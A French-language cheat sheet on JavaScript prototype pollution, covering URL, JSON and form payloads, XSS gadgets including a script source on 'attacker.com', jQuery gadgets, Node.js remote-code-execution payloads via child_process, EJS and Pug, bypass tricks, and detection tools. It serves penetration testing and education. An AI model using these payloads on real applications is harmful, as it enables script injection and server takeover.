# 🧬 Aide-mémoire sur la pollution de prototype

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 Qu’est-ce que la pollution de prototype ?

La **pollution de prototype** (*prototype pollution*) est une vulnérabilité JavaScript qui permet à un attaquant de modifier `Object.prototype` et d’influencer les objets de l’application qui en héritent.

### Conséquences
- 🔴 **XSS** — Manipulation du DOM
- 🔴 **RCE** — Exécution de code à distance côté serveur (Node.js)
- 🔴 **Contournement** — Mécanismes de sécurité
- 🔴 **DoS** — Déni de service par arrêt de l’application

---

## 🔍 Prototypes JavaScript

### Fonctionnement

> **Précision :** l’énoncé « tout objet » est simplifié : `Object.create(null)` produit un objet sans `Object.prototype`, et une propriété propre masque celle héritée. L’affectation manuelle à un prototype démontre l’héritage JavaScript, pas une faille de l’application. Voir [MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).

```javascript
// Tout objet hérite de Object.prototype
let obj = {};
obj.__proto__ === Object.prototype  // true

// Si l’on pollue le prototype :
Object.prototype.polluted = "hacked";

// Tous les objets sont concernés :
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### Propriétés dangereuses
```javascript
__proto__
constructor
prototype
```

---

## 💉 Charges utiles côté client

### Par l’URL (paramètres de requête / fragment)
```
# Cas de base
?__proto__[polluted]=value
?__proto__.polluted=value

# Constructeur
?constructor[prototype][polluted]=value

# Imbriqué
?__proto__[__proto__][polluted]=value

# Encodage URL
?__proto__%5Bpolluted%5D=value
```

### Via JSON

> **Précision :** ces JSON exigent un traitement ultérieur vulnérable pour polluer un prototype. `JSON.parse` traite `__proto__` différemment d’un objet écrit directement en JavaScript. La copie superficielle `Object.assign({},input)` du tableau récapitulatif peut modifier le prototype de la cible sans polluer globalement `Object.prototype`. Voir [MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).

```javascript
// Entrée utilisateur
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Imbriqué
{"a": {"__proto__": {"polluted": "value"}}}
```

### Par les données d’un formulaire
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

## 🔥 Exemples d’exploitation

> **Précision :** un *gadget* est du code existant qui transmet une propriété héritée à un point sensible (*sink*). Ces propriétés ne garantissent pas une XSS : le chemin de données, le navigateur et la CSP comptent, notamment pour `data:`. Le DOM clobbering est un mécanisme distinct fondé sur les noms ou identifiants HTML ; les exemples de propriétés ne démontrent pas cette combinaison. Voir [les gadgets](https://portswigger.net/web-security/prototype-pollution/client-side) et [le DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) chez PortSwigger.

### XSS DOM via innerHTML
```javascript
// Si le code effectue ceci :
element.innerHTML = obj.html || "";

// Pollution :
?__proto__[html]=<img src=x onerror=alert(1)>

// Résultat : XSS !
```

### Gadget utilisant src sur un script
```javascript
// Si le code effectue ceci :
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Pollution :
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### Combinaison avec le DOM clobbering

```javascript
// Motifs courants de gadgets
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### Gadgets jQuery

> **Précision :** le problème historique de fusion profonde montré ici a été corrigé dans jQuery 3.4.0. La charge utile URL exige en outre un traitement et un gadget compatibles dans l’application. Voir [l’annonce officielle](https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/).

```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Exploitation
?__proto__[url]=javascript:alert(1)
```

---

## 🖥️ Côté serveur (Node.js)

> **Précision :** ces exemples sont des schémas historiques, pas des chaînes RCE autonomes. Leur effet dépend des versions de Node.js, EJS ou Pug, des options lues, de la plateforme et des fichiers accessibles ; la présence de `require()` ou `spawn()` ne prouve pas une RCE. Voir [PortSwigger](https://portswigger.net/web-security/prototype-pollution/server-side) et la [documentation de child_process](https://nodejs.org/api/child_process.html).

### RCE via child_process
```javascript
// Si l’application utilise spawn/exec avec un objet d’options :
const { spawn } = require('child_process');
spawn('ls', [], options);

// Pollution :
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Ou :
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### RCE via require()
```javascript
// Charge utile de pollution
{"__proto__": {"main": "./pwned.js"}}
```

### RCE dans les modèles EJS
```javascript
// RCE EJS (< 3.1.7)
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### RCE dans les modèles Pug
```javascript
// RCE Pug
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

## 🔍 Détection

### Tests manuels

L’affectation directe ci-dessous illustre l’héritage, sans prouver une vulnérabilité de l’application (voir la précision sous « Fonctionnement »).

```javascript
// Dans la console du navigateur :
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // Si "polluted" : vulnérable

// Nettoyage
delete Object.prototype.testPollution;
```

### Tests par l’URL
```
# Ajouter à l’URL et vérifier dans la console
?__proto__[test]=polluted

// Dans la console :
({}).test  // Devrait être undefined ; si "polluted" : vulnérable
```

### Rechercher des gadgets (DOM Invader)

> **Précision :** DOM Invader est préinstallé comme extension du navigateur intégré de Burp et désactivé par défaut. L’étape « installer » et le libellé « extension Burp » du tableau sont des raccourcis de l’original : il s’agit de l’activer dans ce navigateur, pas d’ajouter une extension Burp distincte. Voir [la documentation officielle](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling).

```
1. Installer DOM Invader (Burp Suite)
2. Activer le mode de pollution de prototype
3. Parcourir l’application
4. Repérer les points d’utilisation dangereux (sinks) exploitables
```

---

## 🛠️ Outils

| Outil | Fonction |
|------|---------|
| **DOM Invader** | Extension Burp pour détecter la pollution de prototype |
| **ppfuzz** | Fuzzer de pollution de prototype (tests par variation des entrées) |
| **ppmap** | Recherche de gadgets |
| **PPScan** | Scanner côté client |

### Utilisation de ppmap
```bash
# Installation
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Analyse
node ppmap.js https://target.com
```

---

## 📊 Référence rapide

### Formats de charges utiles

| Format | Charge utile |
|--------|---------|
| Paramètres de requête | `?__proto__[x]=y` |
| Fragment | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Fusion | `Object.assign({},input)` |

### Gadgets courants
| Propriété | Conséquence |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Injection de script |
| `href` | Redirection |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### Techniques de contournement

> **Précision :** la ligne `constructor.prototype.polluted` suppose un objet et un contexte d’évaluation compatibles. La notation avec crochets conservée ci-dessous crée un tableau puis lui affecte une propriété ; elle ne modifie pas à elle seule `Object.prototype`. Le décodage Unicode et les filtres dépendent aussi du traitement de l’entrée. Voir [MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).

```javascript
// Si __proto__ est filtré :
constructor.prototype.polluted = "value"

// Autre notation
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

## 📚 Ressources

- [Pollution de prototype — PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [Pollution de prototype côté serveur](https://portswigger.net/research/server-side-prototype-pollution)
- [Scanner de pollution de prototype côté client](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 Polluez le prototype !</b><br>
  <i>Pour les tests autorisés uniquement !</i>
</p>
